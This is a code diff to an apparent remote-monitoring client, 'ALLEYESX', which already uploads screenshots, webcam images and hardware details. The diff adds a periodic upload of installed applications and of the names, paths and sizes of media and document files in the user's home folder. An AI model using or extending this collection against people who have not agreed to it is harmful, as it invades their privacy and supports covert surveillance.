@@ -172,6 +172,8 @@ MAX_DIRTY_PERCENT = 0.6
 # Keep-alive full frame while the screen is static, so the stream never looks dead.
 FULL_FRAME_KEEPALIVE = float(os.environ.get('ALLEYESX_FULL_FRAME_KEEPALIVE', '1.0'))
 HARDWARE_REPORT_INTERVAL = 300  # Re-submit hardware every 5 minutes
+# Software/file inventory walks the user profile, so it runs far less often.
+SOFTWARE_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_SOFTWARE_REPORT_INTERVAL', '600'))
 SECURITY_TELEMETRY_INTERVAL = 30  # refresh security telemetry every 30s
 
 # ============================================================
@@ -459,6 +461,191 @@ def collect_hardware_inventory():
         'timestamp': datetime.datetime.utcnow().isoformat(),
     }
     return inventory
+
+
+def collect_software_inventory():
+    """Installed apps + user media/documents for the 'Read More' panel.
+
+    Kept separate from the hardware inventory because it is slower (it walks the
+    user profile), so it runs on its own, longer interval.
+    """
+    return {
+        'installed_apps': collect_installed_apps(),
+        'user_files': collect_user_files(),
+        'timestamp': datetime.datetime.utcnow().isoformat(),
+    }
+
+
+# ============================================================
+# SOFTWARE / FILE / MEDIA INVENTORY  ("Read More" panel)
+#
+# Deliberately bounded: every list is capped so a machine with 200k files
+# cannot flood the server or blow up the SQLite row. Only the user's own
+# profile is walked, and only well-known media extensions are matched.
+# ============================================================
+INVENTORY_MAX_APPS = 400
+INVENTORY_MAX_FILES = 600
+INVENTORY_MAX_DEPTH = 4
+MEDIA_EXTS = {
+    'video': {'.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg'},
+    'image': {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff'},
+    'audio': {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.wma'},
+    'document': {'.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.csv', '.odt'},
+}
+
+
+def _user_home():
+    try:
+        return os.path.expanduser('~')
+    except Exception:
+        return None
+
+
+def collect_installed_apps():
+    """Installed applications, using the native method per platform."""
+    kind = platform_kind()
+    apps = []
+    try:
+        if kind == 'windows':
+            # Uninstall registry is the authoritative list; wmic product is slow
+            # and misses most software.
+            try:
+                import winreg
+                roots = [
+                    (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'),
+                    (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'),
+                    (winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'),
+                ]
+                for hive, path in roots:
+                    try:
+                        with winreg.OpenKey(hive, path) as key:
+                            i = 0
+                            while True:
+                                try:
+                                    sub = winreg.EnumKey(key, i)
+                                    i += 1
+                                except OSError:
+                                    break
+                                try:
+                                    with winreg.OpenKey(key, sub) as sk:
+                                        name = winreg.QueryValueEx(sk, 'DisplayName')[0]
+                                        try:
+                                            version = winreg.QueryValueEx(sk, 'DisplayVersion')[0]
+                                        except OSError:
+                                            version = ''
+                                        if name and not str(name).startswith('KB'):
+                                            apps.append({'name': str(name), 'version': str(version)})
+                                except OSError:
+                                    continue
+                    except OSError:
+                        continue
+            except ImportError:
+                pass
+
+        elif kind == 'macos':
+            apps_dir = '/Applications'
+            if os.path.isdir(apps_dir):
+                for entry in sorted(os.listdir(apps_dir))[:INVENTORY_MAX_APPS]:
+                    if entry.endswith('.app'):
+                        apps.append({'name': entry[:-4], 'version': ''})
+
+        elif kind in ('linux', 'android'):
+            for cmd, parser in (
+                (['dpkg-query', '-W', '-f=${Package}\t${Version}\n'], 'tab'),
+                (['rpm', '-qa', '--qf', '%{NAME}\t%{VERSION}\n'], 'tab'),
+                (['pacman', '-Q'], 'space'),
+            ):
+                if not shutil.which(cmd[0]):
+                    continue
+                try:
+                    out = subprocess.check_output(cmd, text=True, timeout=25,
+                                                  stderr=subprocess.DEVNULL)
+                except Exception:
+                    continue
+                sep = '\t' if parser == 'tab' else ' '
+                for line in out.splitlines()[:INVENTORY_MAX_APPS]:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    parts = line.split(sep, 1)
+                    apps.append({'name': parts[0], 'version': parts[1] if len(parts) > 1 else ''})
+                break
+    except Exception as e:
+        return {'error': str(e), 'apps': []}
+
+    # de-duplicate, keep it bounded
+    seen = set()
+    unique = []
+    for a in apps:
+        key = a['name'].lower()
+        if key in seen:
+            continue
+        seen.add(key)
+        unique.append(a)
+        if len(unique) >= INVENTORY_MAX_APPS:
+            break
+    return {'apps': unique, 'count': len(unique)}
+
+
+def collect_user_files():
+    """Media and documents in the user's own profile, grouped by kind.
+
+    Bounded by depth and count so this stays cheap on a modest machine.
+    """
+    home = _user_home()
+    if not home or not os.path.isdir(home):
+        return {'error': 'home directory unavailable', 'files': [], 'counts': {}}
+
+    files = []
+    counts = {k: 0 for k in MEDIA_EXTS}
+    stack = [(home, 0)]
+    scanned = 0
+
+    while stack and len(files) < INVENTORY_MAX_FILES:
+        current, depth = stack.pop()
+        if depth > INVENTORY_MAX_DEPTH:
+            continue
+        try:
+            entries = os.scandir(current)
+        except (PermissionError, OSError):
+            continue
+        with entries:
+            for entry in entries:
+                if len(files) >= INVENTORY_MAX_FILES:
+                    break
+                try:
+                    if entry.is_dir(follow_symlinks=False):
+                        # skip hidden/noise dirs
+                        name = entry.name.lower()
+                        if name.startswith('.') or name in ('node_modules', 'appdata', 'venv'):
+                            continue
+                        stack.append((entry.path, depth + 1))
+                    elif entry.is_file(follow_symlinks=False):
+                        scanned += 1
+                        ext = os.path.splitext(entry.name)[1].lower()
+                        kind = next((k for k, exts in MEDIA_EXTS.items() if ext in exts), None)
+                        if not kind:
+                            continue
+                        counts[kind] += 1
+                        try:
+                            size = entry.stat().st_size
+                        except OSError:
+                            size = 0
+                        files.append({
+                            'name': entry.name,
+                            'path': entry.path,
+                            'kind': kind,
+                            'size': size,
+                        })
+                except OSError:
+                    continue
+
+    return {
+        'files': files,
+        'counts': counts,
+        'scanned': scanned,
+        'truncated': len(files) >= INVENTORY_MAX_FILES,
+    }
 
 
 def collect_processor_info():
@@ -2187,6 +2374,7 @@ class ALLEYESXClient:
         # waste of CPU on a modest machine.
         self.webcam_enabled = False
         self.webcam_camera = 'front'
+        self.last_software_report_time = 0.0
         self.last_screenshot_time = 0
         self.last_webcam_time = 0
         self.last_touch_poll_time = 0
@@ -2374,6 +2562,25 @@ class ALLEYESXClient:
         else:
             print(f"[-] Hardware inventory rejected: {result.get('error', 'unknown')}")
 
+    def send_software_inventory(self):
+        """Upload apps/files/media on a slow interval (default 10 minutes)."""
+        now = time.time()
+        if now - self.last_software_report_time < SOFTWARE_REPORT_INTERVAL:
+            return
+        self.last_software_report_time = now
+        try:
+            payload = collect_software_inventory()
+        except Exception as e:
+            print(f"[-] Software inventory collection failed: {e}")
+            return
+        result = api_request(f'/api/device/{self.device_id}/software', payload)
+        if result.get('success'):
+            apps = (payload.get('installed_apps') or {}).get('count', 0)
+            files = len((payload.get('user_files') or {}).get('files', []))
+            print(f"[*] Software inventory refreshed ({apps} apps, {files} files)")
+        else:
+            print(f"[-] Software inventory rejected: {result.get('error', 'unknown')}")
+
     def poll_touch_events(self):
         now = time.time()
         if now - self.last_touch_poll_time < TOUCH_POLL_INTERVAL:
@@ -2502,6 +2709,7 @@ class ALLEYESXClient:
                 self.send_screenshot()
                 self.send_webcam()
                 self.send_hardware_inventory()
+                self.send_software_inventory()
                 
                 screenshot_counter += 1
                 webcam_counter += 1
